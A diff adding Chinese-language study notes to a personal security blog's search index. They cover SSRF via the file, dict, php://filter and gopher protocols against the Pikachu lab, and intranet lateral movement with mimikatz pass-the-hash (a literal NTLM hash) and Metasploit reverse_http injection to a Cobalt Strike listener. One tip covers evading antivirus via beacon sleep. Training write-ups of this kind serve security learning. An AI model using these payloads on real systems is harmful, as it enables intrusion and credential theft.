@@ -105,6 +105,259 @@
       </tags>
   </entry>
   <entry>
+    <title>SSRF漏洞及相关协议学习</title>
+    <url>/2021/12/27/SSRF%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h4 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h4><h5 id="中文意思："><a href="#中文意思：" class="headerlink" title="中文意思："></a>中文意思：</h5><p>本地文件传输协议 </p>
+<h5 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h5><p>File协议主要用于访问本地计算机中的文件。<br>File协议基本的格式如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///C:/file.txt //访问c盘下的file.txt文件</span><br></pre></td></tr></table></figure>
+
+<p>基本格式这里可以借助http网址来理解</p>
+<p>http网址基本格式:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip地址:端口号/文件路径</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<blockquote>
+<p>因为file协议访问的是文件,并没有主机地址,所以就省去了host那部分就变成了最终上面的部分.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file协议:</span><br><span class="line"></span><br><span class="line">1. file协议主要用于读取服务器本地文件，访问的是本地的静态资源</span><br><span class="line"></span><br><span class="line">2. http是访问本地的html文件，相当于把本机当作http服务器，通过http访问服务器，服务器再去访问本地资源。简单来说file只能静态读取，http可以动态解析</span><br><span class="line"></span><br><span class="line">3. http服务器可以开放端口，让他人通过http访问服务器资源，但file不可以</span><br><span class="line"></span><br><span class="line">4. file对应的类似http的协议是ftp协议（文件传输协议）</span><br><span class="line"></span><br><span class="line">5. file不能跨域</span><br></pre></td></tr></table></figure>
+
+<p>curl支持file协议,我们接下来将借助curl工具讲解file协议的用法</p>
+<p>首先在/etc目录下创建文件file.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;hello file&quot; &gt;/etc/file.txt</span><br></pre></td></tr></table></figure>
+
+<p>通过file协议访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl file:///etc/file.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/SSRF%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/1.png" class="">
+
+<h4 id="Dict协议"><a href="#Dict协议" class="headerlink" title="Dict协议"></a>Dict协议</h4><h5 id="定义：-1"><a href="#定义：-1" class="headerlink" title="定义："></a>定义：</h5><p>词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。（摘自百度百科）</p>
+<h5 id="使用dict协议可以获取内网主机开放端口"><a href="#使用dict协议可以获取内网主机开放端口" class="headerlink" title="使用dict协议可以获取内网主机开放端口"></a>使用dict协议可以获取内网主机开放端口</h5><p>通过dict协议，可以看出目标端口的指纹信息，通过返回的指纹信息,判断开启的服务.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl dict://192.168.159.131:80  探测目标主机80端口是否开放及其对应服务</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/SSRF%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/2.png" class="">
+
+<h5 id="dict协议的使用："><a href="#dict协议的使用：" class="headerlink" title="dict协议的使用："></a>dict协议的使用：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. dict://serverip:port/命令:参数</span><br><span class="line">2. 向服务器的端口请求为【命令:参数】，并在末尾自动补上\r\n(CRLF)，为漏洞利用增添了便利</span><br><span class="line">3. 通过dict协议的话要一条一条的执行，而gopher协议执行一条命令就行了。</span><br></pre></td></tr></table></figure>
+
+<h4 id="php中filter协议"><a href="#php中filter协议" class="headerlink" title="php中filter协议"></a>php中filter协议</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><p>PHP 过滤器用于对来自非安全来源的数据（比如用户输入）进行验证和过滤。</p>
+<p>php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；</p>
+<h5 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍:"></a>参数介绍:</h5><table>
+<thead>
+<tr>
+<th><strong>名称</strong></th>
+<th><strong>描述</strong></th>
+<th><strong>备注</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource=&lt;要过滤的数据流&gt;</td>
+<td>指定了你要筛选过滤的数据流。</td>
+<td>必选</td>
+</tr>
+<tr>
+<td>read=&lt;读链的筛选列表&gt;</td>
+<td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
+<td>可选</td>
+</tr>
+<tr>
+<td>write=&lt;写链的筛选列表&gt;</td>
+<td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
+<td>可选</td>
+</tr>
+<tr>
+<td>&lt;；两个链的筛选列表&gt;</td>
+<td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>
+<td></td>
+</tr>
+</tbody></table>
+<h5 id="read参数值"><a href="#read参数值" class="headerlink" title="read参数值"></a>read参数值</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string.strip_tags： //将数据流中的所有html标签清除</span><br><span class="line">string.toupper： //将数据流中的内容转换为大写</span><br><span class="line">string.tolower： //将数据流中的内容转换为小写</span><br><span class="line">convert.base64-encode： //将数据流中的内容转换为base64编码 </span><br></pre></td></tr></table></figure>
+
+<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p>这里我们通过皮卡出靶场的ssrf漏洞题目进行讲解</p>
+<p>看到题目打开的url</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.159.132/pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php </span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/SSRF%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/3.png" class="">
+
+<p>我们可以通过php://filter协议来查看源文件内容；</p>
+<p>首先我们在靶机当前目录下创建filter.php</p>
+<p>内容为echo “Hello phpFilter”</p>
+<img src="/2021/12/27/SSRF%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/4.png" class="">
+
+<p>然后我们通过构造payload远程访问filter文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.159.132/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=filter.php </span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/SSRF%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/5.png" class="">
+
+<p>返回一串编码,这串编码就是我们base64编码后的文件内容,</p>
+<p>解码验证</p>
+<img src="/2021/12/27/SSRF%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/6.png" class="">
+
+<p>当然我们可以通过filter协议构造恶意的payload访问服务器的隐私数据.</p>
+<h4 id="0x01-SSRF-漏洞描述"><a href="#0x01-SSRF-漏洞描述" class="headerlink" title="0x01:SSRF 漏洞描述"></a>0x01:SSRF 漏洞描述</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的</span><br><span class="line">安全漏洞。一般情况下，SSRF 攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所</span><br><span class="line">以服务端能请求到与自身相连而与外网隔离的内部系统)</span><br></pre></td></tr></table></figure>
+
+<h4 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SSRF 的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</span><br><span class="line">例如，黑客操作服务端从指定 URL 地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请</span><br><span class="line">求伪造。SSRF 利用存在缺陷的 Web 应用作为代理攻击远程和本地的服务器。</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/SSRF%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/7.png" class="">
+
+<h4 id="SSRF漏洞防御"><a href="#SSRF漏洞防御" class="headerlink" title="SSRF漏洞防御"></a>SSRF漏洞防御</h4><ul>
+<li><pre><code>- 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的
+- 文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。
+- 禁用不需要的协议，仅仅允许 http 和 https 请求。可以防止类似于 file://, gopher://, ftp:// 等引起的问题
+- 设置 URL 白名单或者限制内网 IP（使用 gethostbyname()判断是否为内网 IP）
+- 限制请求的端口为 http 常用的端口，比如 80、443、8080、8090
+- 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
+</code></pre>
+<blockquote>
+<p>借鉴:实训讲义</p>
+<p>(<a href="https://www.cnblogs.com/tig666666/p/6020460.html">https://www.cnblogs.com/tig666666/p/6020460.html</a>)</p>
+</blockquote>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>web漏洞学习</category>
+      </categories>
+      <tags>
+        <tag>File协议</tag>
+        <tag>Dict协议</tag>
+        <tag>Filter协议</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Gopher协议学习</title>
+    <url>/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h4 id="Gopher协议的学习"><a href="#Gopher协议的学习" class="headerlink" title="Gopher协议的学习"></a>Gopher协议的学习</h4><h5 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h5><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；(百度百科)</p>
+<h5 id="gopher协议格式"><a href="#gopher协议格式" class="headerlink" title="gopher协议格式:"></a>gopher协议格式:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher协议  URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流 可用于构造Http请求包</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/1.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444  //kali开启4444端口进行监听 </span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/2.png" class="">
+
+<h5 id="通过pikachu靶场演示"><a href="#通过pikachu靶场演示" class="headerlink" title="通过pikachu靶场演示"></a>通过pikachu靶场演示</h5><img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/3.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.159.132/pikachu/vul/ssrf/ssrf_curl.php?url=http://192.168.159.132/pikachu/vul/ssrf/ssrf_info/info1.php //看到网站url参数为url=一个url 可能存在ssrf漏洞</span><br></pre></td></tr></table></figure>
+
+<p>我们可以将url后面的参数改为gopheri协议像目标主机发送数据流</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.159.132/pikachu/vul/ssrf/ssrf_curl.php?url=gopher://kaliIP:端口号/这是我发送的数据</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/4.png" class="">
+
+<p>可以看到kali这边成功的接收到了我们通过gopher协议传输的数据</p>
+<h5 id="gopher协议发送GET、POST请求"><a href="#gopher协议发送GET、POST请求" class="headerlink" title="gopher协议发送GET、POST请求"></a>gopher协议发送GET、POST请求</h5><h6 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h6><p>步骤</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、构造HTTP数据包</span><br><span class="line">2、URL编码、替换回车换行为%0d%0a</span><br><span class="line">3、发送gopher协议</span><br></pre></td></tr></table></figure>
+
+<p>GET型的HTTP数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /ssrf/base/get.php?url=test HTTP/1.1</span><br><span class="line">Host: 192.168.159.132</span><br></pre></td></tr></table></figure>
+
+<p>为了方便我们直接在kali中进行演示</p>
+<p>首先进入/var/www/html目录下创建gopher.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www/www   </span><br><span class="line">vim gopher.php</span><br></pre></td></tr></table></figure>
+
+<p>将php代码写入gopher.php中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php echo &quot;Hello &quot;.$_GET[&quot;name&quot;].&quot;\n&quot; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>开启apache</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start apache2 //开启apache</span><br></pre></td></tr></table></figure>
+
+<p>重新打开一个shell</p>
+<p>输入命令 这里注意我们使用的是http数据包,我们每次在浏览器输入的参数等,浏览器都会进行url编码以后才会传输.</p>
+<p>因此我们需要对输入的命令进行url编码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.159.131:80/_GET%20/gopher.php%3fname=xiaobai%20HTTP/1.1%0d%0AHost:%20192.168.159.131%0d%0A </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、问号（？）需要转码为URL编码，也就是%3f</span><br><span class="line">2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</span><br><span class="line">3、在HTTP包的最后要加%0d%0a，代表消息结束 //具体http格式可参考之前写的http请求头学习的文章</span><br></pre></td></tr></table></figure>
+
+<p>成功通过get方式发送http数据包</p>
+<img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/5.png" class="">
+
+<h6 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h6><p>同样的方法先在html目录下创建gopher_post.php文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www/www</span><br><span class="line">vim gopher_post.php</span><br></pre></td></tr></table></figure>
+
+<p>php代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;Hello &quot;.$_POST[&quot;name&quot;].&quot;\n&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>post请求包格式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /gopher_post.php HTTP/1.1 //请求行</span><br><span class="line">host:192.168.159.131 //请求头 </span><br><span class="line"></span><br><span class="line">name=libo //请求实体 </span><br></pre></td></tr></table></figure>
+
+<p>这里需要提醒一下,get请求包是没有请求实体的参数直接跟在了uri后面,而post请求包参数是放在请求实体的,具体详细信息可以参考我之前的文章HTTP请求头的学习文章有详细介绍.</p>
+<p>url编码后</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.159.131:80/_POST%20/gopher_post.php%20HTTP/1.1%0d%0AHost:192.168.159.131%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:13%0d%0A%0d%0Aname=xiaobai%0d%0A </span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/6.png" class="">
+
+<p>成功通过post方式发送数据包</p>
+<p>注意:POST请求头在原有基础上多增加了Content-Type,Content-Length两个请求头参数.</p>
+<blockquote>
+<p>借鉴文章[Gopher协议在SSRF漏洞中的深入研究(<a href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a>)</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>网络协议学习</category>
+      </categories>
+      <tags>
+        <tag>http协议</tag>
+        <tag>Gopher协议</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网渗透</title>
+    <url>/2021/12/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h1 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h1><p>在对内网主机进行信息收集后，接下来我们就是要对内网主机发动攻击。</p>
+<h3 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h3><p>在域环境内，只有获得了<strong>域管理员</strong>的哈希才可以攻击。我们得到了域管理员administrator的哈希，在这里我们就可以用哈希传递攻击了。</p>
+<p>在前面获得了域管理员 administrator 的NTLM哈希为：a4ee66cc11243b7741dbb83262e7eba4</p>
+<p>NTLM: 就是NT的哈希值，前面的章节已经介绍过</p>
+<p>哈希传递工具 必须借助<code>mimikatz</code></p>
+<blockquote>
+<p><em>Mimikatz是一款可以抓取系统内的明文密码的工具</em></p>
+</blockquote>
+<p>通过蚁剑上传到 web目录</p>
+<span id="more"></span>
+
+<p>在meterpreter中运行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> shell</span><br><span class="line">chcp 65001</span><br><span class="line">cd c:\phpstudy\www</span><br></pre></td></tr></table></figure>
+
+<p>运行命令 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug  #提升权限</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#开始 Pass-The-Hash(hash传递攻击域控服务器  也就是 192.168.52.138）</span><br><span class="line">#格式sekurlsa::pth  /user: 用户名 /domain:域控名 /ntlm: NTLM哈希</span><br><span class="line">sekurlsa::pth /user:administrator /domain:&quot;god.org&quot; /ntlm:a4ee66cc11243b7741dbb83262e7eba4</span><br></pre></td></tr></table></figure>
+
+<p>exit 退出</p>
+<p>我们直接远程执行 域控服务器上的命令</p>
+<p>以下所有的命令是在跳板机上执行。</p>
+<p>这里要在中国蚁剑上面执行，在msf里面 会失败</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\192.168.52.138\c$       #查看 C盘目录里面的文件  \\就是网络路径   $就是 根目录的意思</span><br><span class="line">或者</span><br><span class="line">dir \\owa\c$</span><br></pre></td></tr></table></figure>
+
+<p>执行第二台机器上的命令</p>
+<p>还有其他的攻击方式 ，等我们后面讲完漏洞再去学习。</p>
+<h3 id="cobaltstike联动MSF"><a href="#cobaltstike联动MSF" class="headerlink" title="cobaltstike联动MSF"></a>cobaltstike联动MSF</h3><p>首先在CobaltStrike上开启一个监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true   #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一                                   个，所以不需要在产生一个，所以这里我们设置为true</span><br><span class="line">set lhost 192.168.59.134         #cobaltstrike监听的ip   就是服务端的IP</span><br><span class="line">set lport 14444                 #cobaltstrike监听的端口 </span><br><span class="line">set session 1                   #这里是获得的session的id</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>我们打开cs 可以看到主机已经上线</p>
+<p>鼠标右键 —会话交互</p>
+<p>因为60秒执行一次命令，要等待的时间太长  我们改为2 秒，实战中不能改的太短，太短会引起防火墙或者杀软注意</p>
+<p>在最下面 beacon  输入 sleep2  </p>
+<p>输入 help查看命令</p>
+<p>输入命令 抓取密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入命令 抓取密码</span><br></pre></td></tr></table></figure>
+
+<p>横向移动：</p>
+<p>鼠标右键 网络探测：</p>
+<p>这里我们新建一个监听器,这个后面要用</p>
+<p>运行完成后要等 几秒</p>
+<p>同样的办法横向移动到域控</p>
+]]></content>
+      <categories>
+        <category>内网学习</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
+        <tag>日志注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sql注入学习</title>
     <url>/2021/12/26/sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h4 id="前端时间实训讲了sql注入-但是因为那段时间只顾着打靶场了没有做笔记-今天完成第三四次作业时发现很多都忘记了-因此做这篇文章一方面分享知识-另一方面记录相关重要知识-方便后续复习回顾"><a href="#前端时间实训讲了sql注入-但是因为那段时间只顾着打靶场了没有做笔记-今天完成第三四次作业时发现很多都忘记了-因此做这篇文章一方面分享知识-另一方面记录相关重要知识-方便后续复习回顾" class="headerlink" title="前端时间实训讲了sql注入,但是因为那段时间只顾着打靶场了没有做笔记,今天完成第三四次作业时发现很多都忘记了,因此做这篇文章一方面分享知识,另一方面记录相关重要知识,方便后续复习回顾"></a>前端时间实训讲了sql注入,但是因为那段时间只顾着打靶场了没有做笔记,今天完成第三四次作业时发现很多都忘记了,因此做这篇文章一方面分享知识,另一方面记录相关重要知识,方便后续复习回顾</h4><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>我将通过DVWA靶场中的sql题目讲解SQL注入</p>
@@ -457,61 +710,6 @@
 <img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/38.png" class="">
 
 <p>可以看到这台计算机可以选择登录到域或者直接在本地计算机登录,这里我们拿到的是普通用户的域权限时,可以先绕过域通过本地的管理员账户登陆本地计算机然后远程上传kiwi程序,对内存的密码进行提取在用psexec进行登录.</p>
-]]></content>
-      <categories>
-        <category>内网学习</category>
-      </categories>
-      <tags>
-        <tag>内网</tag>
-        <tag>日志注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>内网渗透</title>
-    <url>/2021/12/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<h1 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h1><p>在对内网主机进行信息收集后，接下来我们就是要对内网主机发动攻击。</p>
-<h3 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h3><p>在域环境内，只有获得了<strong>域管理员</strong>的哈希才可以攻击。我们得到了域管理员administrator的哈希，在这里我们就可以用哈希传递攻击了。</p>
-<p>在前面获得了域管理员 administrator 的NTLM哈希为：a4ee66cc11243b7741dbb83262e7eba4</p>
-<p>NTLM: 就是NT的哈希值，前面的章节已经介绍过</p>
-<p>哈希传递工具 必须借助<code>mimikatz</code></p>
-<blockquote>
-<p><em>Mimikatz是一款可以抓取系统内的明文密码的工具</em></p>
-</blockquote>
-<p>通过蚁剑上传到 web目录</p>
-<span id="more"></span>
-
-<p>在meterpreter中运行。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> shell</span><br><span class="line">chcp 65001</span><br><span class="line">cd c:\phpstudy\www</span><br></pre></td></tr></table></figure>
-
-<p>运行命令 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug  #提升权限</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#开始 Pass-The-Hash(hash传递攻击域控服务器  也就是 192.168.52.138）</span><br><span class="line">#格式sekurlsa::pth  /user: 用户名 /domain:域控名 /ntlm: NTLM哈希</span><br><span class="line">sekurlsa::pth /user:administrator /domain:&quot;god.org&quot; /ntlm:a4ee66cc11243b7741dbb83262e7eba4</span><br></pre></td></tr></table></figure>
-
-<p>exit 退出</p>
-<p>我们直接远程执行 域控服务器上的命令</p>
-<p>以下所有的命令是在跳板机上执行。</p>
-<p>这里要在中国蚁剑上面执行，在msf里面 会失败</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\192.168.52.138\c$       #查看 C盘目录里面的文件  \\就是网络路径   $就是 根目录的意思</span><br><span class="line">或者</span><br><span class="line">dir \\owa\c$</span><br></pre></td></tr></table></figure>
-
-<p>执行第二台机器上的命令</p>
-<p>还有其他的攻击方式 ，等我们后面讲完漏洞再去学习。</p>
-<h3 id="cobaltstike联动MSF"><a href="#cobaltstike联动MSF" class="headerlink" title="cobaltstike联动MSF"></a>cobaltstike联动MSF</h3><p>首先在CobaltStrike上开启一个监听</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true   #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一                                   个，所以不需要在产生一个，所以这里我们设置为true</span><br><span class="line">set lhost 192.168.59.134         #cobaltstrike监听的ip   就是服务端的IP</span><br><span class="line">set lport 14444                 #cobaltstrike监听的端口 </span><br><span class="line">set session 1                   #这里是获得的session的id</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<p>我们打开cs 可以看到主机已经上线</p>
-<p>鼠标右键 —会话交互</p>
-<p>因为60秒执行一次命令，要等待的时间太长  我们改为2 秒，实战中不能改的太短，太短会引起防火墙或者杀软注意</p>
-<p>在最下面 beacon  输入 sleep2  </p>
-<p>输入 help查看命令</p>
-<p>输入命令 抓取密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入命令 抓取密码</span><br></pre></td></tr></table></figure>
-
-<p>横向移动：</p>
-<p>鼠标右键 网络探测：</p>
-<p>这里我们新建一个监听器,这个后面要用</p>
-<p>运行完成后要等 几秒</p>
-<p>同样的办法横向移动到域控</p>
 ]]></content>
       <categories>
         <category>内网学习</category>
